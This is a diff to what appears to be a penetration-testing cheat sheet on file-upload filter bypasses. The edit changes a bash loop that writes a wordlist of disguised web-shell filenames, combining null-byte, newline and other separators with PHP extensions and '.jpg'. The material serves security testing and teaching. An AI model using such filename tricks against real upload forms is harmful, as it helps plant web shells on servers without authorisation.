@@ -53,10 +53,15 @@ For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earli
 ```
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' ''; do
     for ext in '.php' '.phps' '.phar' '.phtml'; do
-        echo "shell$char$ext.jpg" >> wordlist.txt
-        echo "shell$ext$char.jpg" >> wordlist.txt
-        echo "shell.jpg$char$ext" >> wordlist.txt
-        echo "shell.jpg$ext$char" >> wordlist.txt
+        if [ -n "$char" ]; then
+            echo "shell$char$ext.jpg" >> wordlist.txt
+            echo "shell$ext$char.jpg" >> wordlist.txt
+            echo "shell.jpg$char$ext" >> wordlist.txt
+            echo "shell.jpg$ext$char" >> wordlist.txt
+        else
+            echo "shell$ext.jpg" >> wordlist.txt
+            echo "shell.jpg$ext" >> wordlist.txt
+        fi
     done
 done
 ```
